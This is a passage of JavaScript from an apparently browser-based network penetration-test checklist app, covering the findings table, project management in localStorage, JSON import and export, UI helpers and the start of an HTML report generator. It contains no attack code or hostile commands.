            // Add findings to their categories
            currentProject.findingDetails.forEach(finding => {
                if (finding.category && findingsByCategory[finding.category]) {
                    findingsByCategory[finding.category].push(finding);
                }
            });
            
            // Count findings by severity for each category
            const categoryCounts = {};
            
            Object.entries(findingsByCategory).forEach(([catId, findings]) => {
                categoryCounts[catId] = {
                    high: findings.filter(f => f.severity === 'critical' || f.severity === 'high').length,
                    medium: findings.filter(f => f.severity === 'medium').length,
                    low: findings.filter(f => f.severity === 'low').length,
                    info: findings.filter(f => f.severity === 'info').length,
                    total: findings.length
                };
            });
            
            // Generate table rows
            Object.entries(categories).forEach(([catId, category]) => {
                const counts = categoryCounts[catId] || { high: 0, medium: 0, low: 0, info: 0, total: 0 };
                
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${category.title}</td>
                    <td class="text-center ${counts.high > 0 ? 'count-high' : ''}">${counts.high}</td>
                    <td class="text-center ${counts.medium > 0 ? 'count-medium' : ''}">${counts.medium}</td>
                    <td class="text-center ${counts.low > 0 ? 'count-low' : ''}">${counts.low}</td>
                    <td class="text-center">${counts.info}</td>
                    <td class="text-center"><strong>${counts.total}</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="${catId}">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            ${counts.total > 0 ? `
                            <button class="action-btn view-findings" data-category="${catId}">
                                <i class="fas fa-eye"></i> <span class="hidden sm:inline">View (${counts.total})</span>
                            </button>
                            ` : ''}
                        </div>
                    </td>
                `;
                
                tableBody.appendChild(row);
            });
            
            // Add event listeners
            tableBody.querySelectorAll('.add-finding').forEach(btn => {
                btn.addEventListener('click', () => {
                    addFinding(btn.getAttribute('data-category'));
                });
            });
            
            tableBody.querySelectorAll('.view-findings').forEach(btn => {
                btn.addEventListener('click', () => {
                    viewFindingsByCategory(btn.getAttribute('data-category'));
                });
            });
        }

        function addFinding(categoryId = null, findingId = null) {
            currentEditingFindingId = findingId;
            
            // Prepare the modal
            const modal = document.getElementById('finding-modal');
            const modalTitle = document.getElementById('finding-modal-title');
            const categorySelect = document.getElementById('finding-category');
            const saveButton = document.getElementById('btn-save-finding');
            
            if (!modal || !modalTitle || !categorySelect || !saveButton) return;
            
            // Reset the form
            document.getElementById('finding-form')?.reset();
            
            // Populate category dropdown
            categorySelect.innerHTML = '';
            Object.entries(categories).forEach(([id, category]) => {
                const option = document.createElement('option');
                option.value = id;
                option.textContent = category.title;
                categorySelect.appendChild(option);
            });
            
            if (findingId) {
                // Edit existing finding
                const finding = currentProject.findingDetails?.find(f => f.id === findingId);
                if (finding) {
                    modalTitle.textContent = 'Edit Finding';
                    
                    // Set form values
                    categorySelect.value = finding.category || '';
                    document.getElementById('finding-title').value = finding.title || '';
                    document.getElementById('finding-severity').value = finding.severity || 'high';
                    document.getElementById('finding-description').value = finding.description || '';
                    document.getElementById('finding-steps').value = finding.steps || '';
                    document.getElementById('finding-remediation').value = finding.remediation || '';
                }
            } else {
                // Add new finding
                modalTitle.textContent = 'Add Finding';
                
                // Set default category if provided
                if (categoryId) {
                    categorySelect.value = categoryId;
                }
                
                // Set default severity
                document.getElementById('finding-severity').value = 'high';
            }
            
            openModal(modal);
        }

        function saveFinding() {
            const categoryId = document.getElementById('finding-category').value;
            const title = document.getElementById('finding-title').value.trim();
            const severity = document.getElementById('finding-severity').value;
            const description = document.getElementById('finding-description').value.trim();
            const steps = document.getElementById('finding-steps').value.trim();
            const remediation = document.getElementById('finding-remediation').value.trim();
            
            // Validate required fields
            if (!title || !description) {
                showToast('Title and description are required', 'error');
                return;
            }
            
            // Initialize findingDetails if it doesn't exist
            if (!currentProject.findingDetails) {
                currentProject.findingDetails = [];
            }
            
            if (currentEditingFindingId) {
                // Update existing finding
                const index = currentProject.findingDetails.findIndex(f => f.id === currentEditingFindingId);
                if (index !== -1) {
                    currentProject.findingDetails[index] = {
                        ...currentProject.findingDetails[index],
                        category: categoryId,
                        title: title,
                        severity: severity,
                        description: description,
                        steps: steps,
                        remediation: remediation,
                        lastEdited: new Date().toISOString()
                    };
                    showToast('Finding updated successfully', 'success');
                }
            } else {
                // Add new finding
                currentProject.findingDetails.push({
                    id: 'finding_' + Date.now(),
                    category: categoryId,
                    title: title,
                    severity: severity,
                    description: description,
                    steps: steps,
                    remediation: remediation,
                    date: new Date().toISOString()
                });
                showToast('Finding added successfully', 'success');
            }
            
            // Reset editing state
            currentEditingFindingId = null;
            
            // Save project and update findings table
            saveProjectToStorage();
            initFindingsTable();
            
            // Close modal
            closeModal(document.getElementById('finding-modal'));
        }

        function viewFindingsByCategory(categoryId) {
            if (!currentProject.findingDetails || !categories[categoryId]) return;
            
            const findings = currentProject.findingDetails.filter(f => f.category === categoryId);
            
            if (findings.length === 0) {
                showToast(`No findings for ${categories[categoryId].title}`, 'info');
                return;
            }
            
            // Show findings in a modal
            const modal = document.getElementById('view-finding-modal');
            const modalTitle = document.getElementById('view-finding-title');
            const contentDiv = document.getElementById('view-finding-content');
            const actionsDiv = document.getElementById('view-finding-actions');
            
            if (!modal || !modalTitle || !contentDiv || !actionsDiv) return;
            
            modalTitle.textContent = `Findings: ${categories[categoryId].title}`;
            
            // Generate findings list
            let html = '<div class="space-y-4">';
            
            findings.forEach(finding => {
                const severityClass = 
                    finding.severity === 'critical' ? 'text-danger font-semibold' :
                    finding.severity === 'high' ? 'text-warning font-semibold' :
                    finding.severity === 'medium' ? 'text-primary font-semibold' :
                    finding.severity === 'low' ? 'text-success font-semibold' : 'text-info font-semibold';
                
                html += `
                    <div class="p-4 border rounded-lg hover:bg-gray-50 cursor-pointer view-finding-details" data-finding-id="${finding.id}">
                        <div class="flex justify-between items-center mb-2">
                            <h4 class="font-medium">${finding.title}</h4>
                            <span class="${severityClass}">${finding.severity.charAt(0).toUpperCase() + finding.severity.slice(1)}</span>
                        </div>
                        <p class="text-gray-600 text-sm line-clamp-2">${finding.description}</p>
                    </div>
                `;
            });
            
            html += '</div>';
            
            contentDiv.innerHTML = html;
            actionsDiv.innerHTML = ''; // No actions for category view
            
            // Add click event listeners to findings
            openModal(modal);
            
            modal.querySelectorAll('.view-finding-details').forEach(elem => {
                elem.addEventListener('click', function() {
                    const findingId = this.getAttribute('data-finding-id');
                    viewFindingDetails(findingId);
                });
            });
        }

        function viewFindingDetails(findingId) {
            if (!currentProject.findingDetails) return;
            
            const finding = currentProject.findingDetails.find(f => f.id === findingId);
            if (!finding) return;
            
            // Show finding details in a modal
            const modal = document.getElementById('view-finding-modal');
            const modalTitle = document.getElementById('view-finding-title');
            const contentDiv = document.getElementById('view-finding-content');
            const actionsDiv = document.getElementById('view-finding-actions');
            
            if (!modal || !modalTitle || !contentDiv || !actionsDiv) return;
            
            modalTitle.textContent = `Finding: ${finding.title}`;
            
            // Generate finding details
            const severityClass = 
                finding.severity === 'critical' ? 'text-danger' :
                finding.severity === 'high' ? 'text-warning' :
                finding.severity === 'medium' ? 'text-primary' :
                finding.severity === 'low' ? 'text-success' : 'text-info';
            
            let html = `
                <div class="space-y-4">
                    <div class="flex flex-wrap gap-4 text-sm">
                        <div><strong class="text-gray-700">Severity:</strong> <span class="${severityClass} font-semibold">${finding.severity.charAt(0).toUpperCase() + finding.severity.slice(1)}</span></div>
                        <div><strong class="text-gray-700">Category:</strong> <span>${categories[finding.category]?.title || 'Unknown'}</span></div>
                        <div><strong class="text-gray-700">Discovered:</strong> <span>${formatDate(finding.date)}</span></div>
                        ${finding.lastEdited ? `<div><strong class="text-gray-700">Last Edited:</strong> <span>${formatDate(finding.lastEdited)}</span></div>` : ''}
                    </div>
                    
                    <div>
                        <h4 class="font-semibold mb-2">Description</h4>
                        <div class="bg-gray-50 p-4 rounded-lg border">${finding.description.replace(/\n/g, '<br>')}</div>
                    </div>
                    
                    ${finding.steps ? `
                    <div>
                        <h4 class="font-semibold mb-2">Steps to Reproduce</h4>
                        <div class="bg-gray-50 p-4 rounded-lg border font-mono text-sm">${finding.steps.replace(/\n/g, '<br>')}</div>
                    </div>
                    ` : ''}
                    
                    ${finding.remediation ? `
                    <div>
                        <h4 class="font-semibold mb-2">Remediation</h4>
                        <div class="bg-gray-50 p-4 rounded-lg border">${finding.remediation.replace(/\n/g, '<br>')}</div>
                    </div>
                    ` : ''}
                </div>
            `;
            
            contentDiv.innerHTML = html;
            
            // Add action buttons
            actionsDiv.innerHTML = `
                <button class="btn btn-primary" id="edit-finding-btn">
                    <i class="fas fa-edit"></i> Edit
                </button>
                <button class="btn btn-danger" id="delete-finding-btn">
                    <i class="fas fa-trash"></i> Delete
                </button>
            `;
            
            openModal(modal);
            
            // Add event listeners to action buttons
            document.getElementById('edit-finding-btn').addEventListener('click', function() {
                closeModal(modal);
                addFinding(null, findingId);
            });
            
            document.getElementById('delete-finding-btn').addEventListener('click', function() {
                confirmDelete('Are you sure you want to delete this finding?', function() {
                    deleteFinding(findingId);
                    closeModal(modal);
                });
            });
        }

        function deleteFinding(findingId) {
            if (!currentProject.findingDetails) return;
            
            const index = currentProject.findingDetails.findIndex(f => f.id === findingId);
            if (index !== -1) {
                currentProject.findingDetails.splice(index, 1);
                saveProjectToStorage();
                initFindingsTable();
                showToast('Finding deleted successfully', 'success');
            }
        }

        // --- Project Management ---

        function loadProjectsFromStorage() {
            try {
                const data = localStorage.getItem(STORAGE_KEY);
                if (data) {
                    projects = JSON.parse(data);
                    
                    // Check if we have any projects
                    if (Object.keys(projects).length > 0) {
                        // Load default or first project
                        const projectId = projects['default'] ? 'default' : Object.keys(projects)[0];
                        currentProject = projects[projectId];
                        
                        // Ensure required properties exist
                        ensureProjectProperties(currentProject);
                    } else {
                        createDefaultProject();
                    }
                } else {
                    createDefaultProject();
                }
            } catch (error) {
                console.error('Error loading projects from storage:', error);
                createDefaultProject();
            }
        }

        function createDefaultProject() {
            const defaultId = 'default';
            currentProject = {
                id: defaultId,
                name: 'Default Network Pentest',
                target: 'example.com',
                date: new Date().toISOString().split('T')[0],
                tester: 'Security Tester',
                scope: 'Internal network (10.0.0.0/8)',
                lastUpdated: new Date().toISOString(),
                taskStatus: {},
                notes: {},
                findingDetails: []
            };
            
            projects = { [defaultId]: currentProject };
            saveProjectToStorage();
        }

        function ensureProjectProperties(project) {
            if (!project.taskStatus) project.taskStatus = {};
            if (!project.notes) project.notes = {};
            if (!project.findingDetails) project.findingDetails = [];
            return project;
        }

        function saveProjectToStorage() {
            try {
                if (currentProject && currentProject.id) {
                    // Update the current project in the projects object
                    projects[currentProject.id] = currentProject;
                    
                    // Save all projects to localStorage
                    localStorage.setItem(STORAGE_KEY, JSON.stringify(projects));
                }
            } catch (error) {
                console.error('Error saving project to storage:', error);
                showToast('Failed to save project. Storage might be full.', 'error');
            }
        }

    function updateProjectUI() {
    if (!currentProject) return;
    
    // Update project info section
    document.getElementById('project-name').textContent = currentProject.name || 'Unnamed Project';
    document.getElementById('project-target').textContent = currentProject.target || 'N/A';
    document.getElementById('project-date').textContent = currentProject.date ? formatDate(currentProject.date) : 'N/A';
    document.getElementById('project-tester').textContent = currentProject.tester || 'N/A';
    document.getElementById('project-scope').textContent = currentProject.scope || 'N/A';
    document.getElementById('project-updated').textContent = formatDate(currentProject.lastUpdated);
    
    // This line is removed or commented out
    // document.getElementById('current-project-name').textContent = currentProject.name || 'Unnamed Project';
}

        function editProject() {
            const modal = document.getElementById('project-modal');
            if (!modal || !currentProject) return;
            
            // Populate form with current project details
            document.getElementById('edit-project-name').value = currentProject.name || '';
            document.getElementById('edit-project-target').value = currentProject.target || '';
            document.getElementById('edit-project-date').value = currentProject.date || '';
            document.getElementById('edit-project-tester').value = currentProject.tester || '';
            document.getElementById('edit-project-scope').value = currentProject.scope || '';
            
            openModal(modal);
        }

        function saveProjectDetails() {
            const name = document.getElementById('edit-project-name').value.trim();
            if (!name) {
                showToast('Project name is required', 'error');
                return;
            }
            
            // Update current project
            currentProject.name = name;
            currentProject.target = document.getElementById('edit-project-target').value.trim();
            currentProject.date = document.getElementById('edit-project-date').value;
            currentProject.tester = document.getElementById('edit-project-tester').value.trim();
            currentProject.scope = document.getElementById('edit-project-scope').value.trim();
            currentProject.lastUpdated = new Date().toISOString();
            
            // Save and update UI
            saveProjectToStorage();
            updateProjectUI();
            
            // Close modal
            closeModal(document.getElementById('project-modal'));
            showToast('Project details updated', 'success');
        }

        function openProjectsModal() {
            const modal = document.getElementById('projects-modal');
            const listContainer = document.getElementById('projects-list');
            if (!modal || !listContainer) return;
            
            // Clear list
            listContainer.innerHTML = '';
            
            // Check if we have projects
            if (Object.keys(projects).length === 0) {
                listContainer.innerHTML = '<li class="p-4 text-center text-gray-500">No projects found.</li>';
                openModal(modal);
                return;
            }
            
            // Sort projects by last updated (newest first)
            const sortedProjects = Object.values(projects).sort((a, b) => {
                return new Date(b.lastUpdated || 0) - new Date(a.lastUpdated || 0);
            });
            
            // Generate project list
            sortedProjects.forEach(project => {
                const isActive = project.id === currentProject.id;
                
                const li = document.createElement('li');
                li.className = `p-4 border-b ${isActive ? 'bg-blue-50' : ''}`;
                
                li.innerHTML = `
                    <div class="flex items-center justify-between">
                        <div>
                            <h4 class="font-medium ${isActive ? 'text-blue-700' : ''}">${project.name}</h4>
                            <div class="text-sm text-gray-500">
                                <span>${project.target || 'No target'}</span>  
                                <span>Updated: ${formatDate(project.lastUpdated)}</span>
                            </div>
                        </div>
                        <div class="flex gap-2">
                            ${!isActive ? `
                            <button class="btn btn-sm btn-primary load-project" data-project-id="${project.id}">
                                <i class="fas fa-folder-open"></i> Load
                            </button>
                            ` : `
                            <button class="btn btn-sm btn-secondary" disabled>
                                <i class="fas fa-check"></i> Active
                            </button>
                            `}
                            ${project.id !== 'default' ? `
                            <button class="btn btn-sm btn-danger delete-project" data-project-id="${project.id}">
                                <i class="fas fa-trash"></i>
                            </button>
                            ` : ''}
                        </div>
                    </div>
                `;
                
                listContainer.appendChild(li);
            });
            
            // Add event listeners
            listContainer.querySelectorAll('.load-project').forEach(btn => {
                btn.addEventListener('click', function() {
                    loadProject(this.getAttribute('data-project-id'));
                    closeModal(modal);
                });
            });
            
            listContainer.querySelectorAll('.delete-project').forEach(btn => {
                btn.addEventListener('click', function() {
                    const projectId = this.getAttribute('data-project-id');
                    const projectName = projects[projectId]?.name || 'this project';
                    
                    confirmDelete(`Are you sure you want to delete "${projectName}"?`, function() {
                        deleteProject(projectId);
                    });
                });
            });
            
            openModal(modal);
        }

        function loadProject(projectId) {
            if (!projects[projectId]) {
                showToast('Project not found', 'error');
                return;
            }
            
            currentProject = projects[projectId];
            ensureProjectProperties(currentProject);
            
            updateProjectUI();
            updateProgressIndicators();
            initFindingsTable();
            closeCategory();
            
            showToast(`Project "${currentProject.name}" loaded`, 'success');
        }

        function deleteProject(projectId) {
            if (projectId === 'default') {
                showToast('Cannot delete the default project', 'warning');
                return;
            }
            
            if (projects[projectId]) {
                // Delete the project
                delete projects[projectId];
                
                // Save projects
                localStorage.setItem(STORAGE_KEY, JSON.stringify(projects));
                
                // If current project was deleted, load default
                if (currentProject.id === projectId) {
                    if (projects['default']) {
                        loadProject('default');
                    } else if (Object.keys(projects).length > 0) {
                        loadProject(Object.keys(projects)[0]);
                    } else {
                        createDefaultProject();
                        updateProjectUI();
                        updateProgressIndicators();
                        initFindingsTable();
                    }
                }
                
                // Refresh projects modal
                showToast('Project deleted', 'success');
                openProjectsModal();
            }
        }

        function openNewProjectModal() {
            const modal = document.getElementById('new-project-modal');
            if (!modal) return;
            
            // Reset form
            document.getElementById('new-project-form')?.reset();
            
            // Set default date to today
            document.getElementById('new-project-date').value = new Date().toISOString().split('T')[0];
            
            openModal(modal);
        }

        function createNewProject() {
            const name = document.getElementById('new-project-name').value.trim();
            if (!name) {
                showToast('Project name is required', 'error');
                return;
            }
            
            // Generate unique ID
            const projectId = 'project_' + Date.now();
            
            // Create new project
            const newProject = {
                id: projectId,
                name: name,
                target: document.getElementById('new-project-target').value.trim(),
                date: document.getElementById('new-project-date').value,
                tester: document.getElementById('new-project-tester').value.trim(),
                scope: document.getElementById('new-project-scope').value.trim(),
                lastUpdated: new Date().toISOString(),
                taskStatus: {},
                notes: {},
                findingDetails: []
            };
            
            // Add to projects collection
            projects[projectId] = newProject;
            
            // Save projects
            localStorage.setItem(STORAGE_KEY, JSON.stringify(projects));
            
            // Load the new project
            loadProject(projectId);
            
            // Close modal
            closeModal(document.getElementById('new-project-modal'));
            showToast(`Project "${name}" created`, 'success');
        }

        // --- Import/Export ---

        function exportProject() {
            if (!currentProject) {
                showToast('No project to export', 'error');
                return;
            }
            
            try {
                // Prepare export data
                const exportData = {
                    version: '1.0',
                    timestamp: new Date().toISOString(),
                    project: currentProject
                };
                
                // Convert to JSON string
                const jsonString = JSON.stringify(exportData, null, 2);
                
                // Create blob and download link
                const blob = new Blob([jsonString], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                
                // Create download link
                const a = document.createElement('a');
                a.href = url;
                a.download = `netpentest_${currentProject.name.replace(/[^a-z0-9]/gi, '_').toLowerCase()}_${new Date().toISOString().slice(0, 10)}.json`;
                document.body.appendChild(a);
                a.click();
                
                // Clean up
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 100);
                
                showToast('Project exported successfully', 'success');
            } catch (error) {
                console.error('Error exporting project:', error);
                showToast('Failed to export project', 'error');
            }
        }

        function openImportModal() {
            // This would normally display a file input modal
            // For simplicity, we'll directly trigger a file input
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = '.json';
            
            input.onchange = function(e) {
                const file = e.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = function(event) {
                        try {
                            const importData = JSON.parse(event.target.result);
                            
                            // Basic validation
                            if (!importData.project || !importData.project.id || !importData.project.name) {
                                throw new Error('Invalid project file format');
                            }
                            
                            // Confirm import
                            confirmDialog(
                                `Import Project "${importData.project.name}"?`,
                                'This will add the project to your collection. Continue?',
                                function() {
                                    importProject(importData.project);
                                }
                            );
                        } catch (error) {
                            console.error('Error parsing import file:', error);
                            showToast('Invalid project file format', 'error');
                        }
                    };
                    reader.readAsText(file);
                }
            };
            
            input.click();
        }

        function importProject(project) {
            try {
                // Generate new ID to avoid overwriting existing projects
                const projectId = 'project_' + Date.now();
                project.id = projectId;
                
                // Ensure project has all required properties
                ensureProjectProperties(project);
                
                // Add to projects collection
                projects[projectId] = project;
                
                // Save projects
                localStorage.setItem(STORAGE_KEY, JSON.stringify(projects));
                
                // Load the imported project
                loadProject(projectId);
                
                showToast(`Project "${project.name}" imported successfully`, 'success');
            } catch (error) {
                console.error('Error importing project:', error);
                showToast('Failed to import project', 'error');
            }
        }

        // --- UI Helpers ---

        function openModal(modal) {
            if (typeof modal === 'string') {
                modal = document.getElementById(modal);
            }
            if (!modal) return;
            
            modal.classList.add('active');
        }

        function closeModal(modal) {
            if (typeof modal === 'string') {
                modal = document.getElementById(modal);
            }
            if (!modal) return;
            
            modal.classList.remove('active');
        }

        function showToast(message, type = 'success') {
            // Create toast container if it doesn't exist
            let container = document.querySelector('.toast-container');
            if (!container) {
                container = document.createElement('div');
                container.className = 'toast-container';
                document.body.appendChild(container);
            }
            
            // Create toast element
            const toast = document.createElement('div');
            toast.className = `toast toast-${type}`;
            
            // Set icon based on type
            let icon = 'fa-check-circle';
            if (type === 'error') icon = 'fa-times-circle';
            else if (type === 'warning') icon = 'fa-exclamation-circle';
            else if (type === 'info') icon = 'fa-info-circle';
            
            toast.innerHTML = `
                <i class="fas ${icon} toast-icon"></i>
                <span class="toast-message">${message}</span>
            `;
            
            // Add to container
            container.appendChild(toast);
            
            // Show the toast
            setTimeout(() => {
                toast.classList.add('show');
            }, 10);
            
            // Remove after timeout
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => {
                    container.removeChild(toast);
                }, 300);
            }, 3000);
        }

        function confirmDialog(title, message, callback) {
            const modal = document.getElementById('confirm-modal');
            if (!modal) return;
            
            document.getElementById('confirm-title').textContent = title;
            document.getElementById('confirm-message').textContent = message;
            
            confirmCallback = callback;
            
            openModal(modal);
        }

        function confirmDelete(message, callback) {
            confirmDialog('Confirm Deletion', message, callback);
        }

        function formatDate(dateString) {
            if (!dateString) return 'N/A';
            
            try {
                const date = new Date(dateString);
                return date.toLocaleString();
            } catch (e) {
                return dateString;
            }
        }

        function printChecklist() {
            window.print();
        }

        function generateReport() {
            // Open a new window for the report
            const reportWindow = window.open('', '_blank');
            if (!reportWindow) {
                showToast('Popup blocked. Please allow popups for reporting.', 'error');
                return;
            }
            
            // Calculate statistics
            const stats = calculateReportStats();
            
            // Generate HTML content for the report
            const reportContent = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Network Penetration Test Report - ${currentProject.name}</title>
                <style>
                    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
                    
                    :root {
                        --primary: #2a4f91;
                        --primary-dark: #051937;
                        --primary-light: #4169e1;
                        --secondary: #00bf8f;
                        --danger: #dc3545;
                        --warning: #ff9500;
                        --info: #3498db;
                        --success: #28a745;
                        --dark-gray: #343a40;
                        --medium-gray: #6c757d;
                        --light-gray: #e9ecef;
                        --white: #ffffff;
                    }
                    
                    body {
                        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
                        line-height: 1.6;
                        color: var(--dark-gray);
                        margin: 0;
                        padding: 0;
                        background-color: var(--white);
                    }
                    
                    .container {
                        max-width: 1100px;
                        margin: 0 auto;
                        padding: 2rem;
                    }
                    
                    .report-header {
                        background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
                        color: var(--white);
                        padding: 3rem 2rem;
                        text-align: center;
                        margin-bottom: 2rem;
                    }
                    
                    .report-title {
                        font-size: 2.5rem;
                        margin: 0 0 1rem 0;
                        font-weight: 700;
                    }
                    
                    .report-subtitle {
                        font-size: 1.25rem;
                        opacity: 0.9;
                        margin: 0;
                        font-weight: 400;
                    }
                    
                    h1, h2, h3, h4, h5, h6 {
                        color: var(--primary-dark);
                        margin-top: 1.5rem;
                        margin-bottom: 1rem;
                    }
                    
                    h1 { font-size: 2rem; }
                    h2 { font-size: 1.75rem; border-bottom: 2px solid var(--light-gray); padding-bottom: 0.5rem; }
                    h3 { font-size: 1.5rem; }
                    h4 { font-size: 1.25rem; }
                    
                    p {
                        margin: 0 0 1rem 0;
                    }
                    
                    .card {
                        background-color: var(--white);
                        border-radius: 0.5rem;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        padding: 1.5rem;
                        margin-bottom: 1.5rem;
                    }
                    
                    .table {
                        width: 100%;
                        border-collapse: collapse;
                        margin-bottom: 1.5rem;
                    }
                    
                    .table th,
                    .table td {
                        padding: 0.75rem;
                        border: 1px solid var(--light-gray);
                    }
                    
                    .table th {
                        background-color: var(--light-gray);
                        font-weight: 600;
                        text-align: left;
                    }
                    
                    .table tr:nth-child(even) {
                        background-color: rgba(0,0,0,0.02);
                    }
                    
                    .progress-section {
                        display: grid;
                        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                        gap: 1rem;
                        margin-bottom: 1.5rem;
                    }
                    
                    .progress-card {
                        background-color: var(--white);
                        border-radius: 0.5rem;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        padding: 1.25rem;
                    }
                    
                    .progress-title {
                        font-size: 1rem;
                        margin: 0 0 0.75rem 0;
                        font-weight: 600;
                    }
                    
                    .progress-bar {
                        height: 0.5rem;
                        background-color: var(--light-gray);
                        border-radius: 1rem;
                        overflow: hidden;
                        margin-bottom: 0.5rem;
                    }
                    
                    .progress-value {
                        height: 100%;
                        border-radius: 1rem;
                    }
                    
                    .progress-overall .progress-value { background-color: var(--primary); }
                    .progress-critical .progress-value { background-color: var(--danger); }
                    .progress-high .progress-value { background-color: var(--warning); }
                    .progress-medium .progress-value { background-color: var(--success); }
                    
                    .progress-info {
                        display: flex;
                        justify-content: space-between;
                        font-size: 0.875rem;
                        color: var(--medium-gray);
                    }
                    
                    .text-danger { color: var(--danger); }
                    .text-warning { color: var(--warning); }
                    .text-success { color: var(--success); }
                    .text-info { color: var(--info); }
                    
                    .badge {
                        display: inline-block;
                        padding: 0.25rem 0.5rem;
                        border-radius: 0.25rem;
                        font-weight: 600;
                        font-size: 0.75rem;
                    }
                    
                    .badge-danger { background-color: var(--danger); color: white; }
                    .badge-warning { background-color: var(--warning); color: white; }
                    .badge-success { background-color: var(--success); color: white; }
                    .badge-info { background-color: var(--info); color: white; }
                    
                    .finding-card {
                        border-left: 4px solid var(--primary);
                        padding: 1.25rem;
                        margin-bottom: 1.5rem;
                        background-color: var(--white);
                        border-radius: 0 0.5rem 0.5rem 0;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                    }
                    
                    .finding-card.critical { border-left-color: var(--danger); }
                    .finding-card.high { border-left-color: var(--warning); }
                    .finding-card.medium { border-left-color: var(--secondary); }
                    .finding-card.low { border-left-color: var(--success); }
                    
                    .finding-header {
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        margin-bottom: 1rem;
                    }
                    
                    .finding-title {
                        font-size: 1.25rem;
                        font-weight: 600;
                        margin: 0;
                    }
                    
                    .finding-section {
                        margin-bottom: 1rem;
                    }
                    
                    .finding-section-title {
                        font-weight: 600;
                        margin: 0 0 0.5rem 0;
                    }
                    
                    .finding-meta {
                        margin-top: 1rem;
                        font-size: 0.875rem;
                        color: var(--medium-gray);
                    }
                    
                    .page-break {
                        page-break-before: always;
                    }
                    
                    @media print {
                        .container {
                            padding: 0;
                            max-width: 100%;
                        }
                        
                        .report-header {
                            padding: 2rem;
                        }
                        
                        .card, .progress-card, .finding-card {
                            box-shadow: none;
                            border: 1px solid var(--light-gray);
                        }
                        
                        .finding-card.critical { border-left: 4px solid var(--danger); }
                        .finding-card.high { border-left: 4px solid var(--warning); }
                        .finding-card.medium { border-left: 4px solid var(--secondary); }
                        .finding-card.low { border-left: 4px solid var(--success); }
                    }
                </style>
            </head>
            <body>
                <header class="report-header">
                    <h1 class="report-title">Network Penetration Test Report</h1>
                    <p class="report-subtitle">${currentProject.name}</p>
                </header>
                
                <main class="container">
                    <section>
                        <h2>Executive Summary</h2>
                        <div class="card">
                            <p>This report presents the findings of a comprehensive network penetration test conducted on ${currentProject.target || 'the target environment'} from ${formatDate(currentProject.date)}. The assessment was designed to identify security vulnerabilities in the network infrastructure and provide recommendations for remediation.</p>
                            
                            <p>The assessment identified a total of <strong>${stats.totalFindings}</strong> security findings across the tested network components, with ${stats.criticalFindings} critical, ${stats.highFindings} high, ${stats.mediumFindings} medium, and ${stats.lowFindings} low-risk vulnerabilities.</p>
                            
                            <p>Overall, the assessment has completed ${stats.completedTasks} out of ${stats.applicableTasks} applicable security tests (${stats.overallPercent}% complete).</p>
                        </div>
                    </section>
                    
                    <section>
                        <h2>Project Information</h2>
                        <table class="table">
                            <tr>
                                <th width="30%">Project Name</th>
                                <td>${currentProject.name || 'N/A'}</td>
                            </tr>
                            <tr>
                                <th>Target</th>
                                <td>${currentProject.target || 'N/A'}</td>
                            </tr>
                            <tr>
                                <th>Assessment Date</th>
                                <td>${formatDate(currentProject.date)}</td>
                            </tr>
                            <tr>
                                <th>Lead Tester</th>
                                <td>${currentProject.tester || 'N/A'}</td>
                            </tr>
                            <tr>
                                <th>Scope</th>
                                <td>${(currentProject.scope || 'N/A').replace(/\n/g, '<br>')}</td>
                            </tr>
                            <tr>
                                <th>Report Generated</th>
                                <td>${formatDate(new Date().toISOString())}</td>
                            </tr>
                        </table>
                    </section>
                    
                    <section>
                        <h2>Assessment Progress</h2>
                        
                        <div class="progress-section">
                            <div class="progress-card">
                                <h3 class="progress-title">Overall Progress</h3>
                                <div class="progress-bar progress-overall">
                                    <div class="progress-value" style="width: ${stats.overallPercent}%"></div>
                                </div>
                                <div class="progress-info">
                                    <span>${stats.completedTasks}/${stats.applicableTasks} tests completed</span>
                                    <span>${stats.overallPercent}%</span>
                                </div>
                            </div>
                            
                            <div class="progress-card">
                                <h3 class="progress-title">Critical Priority</h3>
                                <div class="progress-bar progress-critical">
                                    <div class="progress-value" style="width: ${stats.criticalPercent}%"></div>
                                </div>
                                <div class="progress-info">
                                    <span>${stats.criticalCompleted}/${stats.criticalApplicable} tests completed</span>
                                    <span>${stats.criticalPercent}%</span>
                                </div>
                            </div>
                        </div>
                        
                        <div class="progress-section">
                            <div class="progress-card">
                                <h3 class="progress-title">High Priority</h3>
                                <div class="progress-bar progress-high">
                                    <div class="progress-value" style="width: ${stats.highPercent}%"></div>
                                </div>
                                <div class="progress-info">
                                    <span>${stats.highCompleted}/${stats.highApplicable} tests completed</span>
                                    <span>${stats.highPercent}%</span>
                                </div>
                            </div>
                            
                            <div class="progress-card">
                                <h3 class="progress-title">Medium Priority</h3>
                                <div class="progress-bar progress-medium">
                                    <div class="progress-value" style="width: ${stats.mediumPercent}%"></div>
                                </div>
                                <div class="progress-info">
                                    <span>${stats.mediumCompleted}/${stats.mediumApplicable} tests completed</span>
                                    <span>${stats.mediumPercent}%</span>
                                </div>
                            </div>
                        </div>
                    </section>
                    
                    <section>
                        <h2>Testing Categories Progress</h2>
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>Category</th>
                                    <th>Priority</th>
                                    <th>Progress</th>
                                    <th>Findings</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${Object.entries(categories).map(([id, category]) => {
                                    const catProgress = stats.categoryProgress[id] || { percent: 0, completed: 0, applicable: 0 };
                                    const catFindings = stats.findingsByCategory[id]?.length || 0;
                                    return `
                                    <tr>
                                        <td>${category.title}</td>
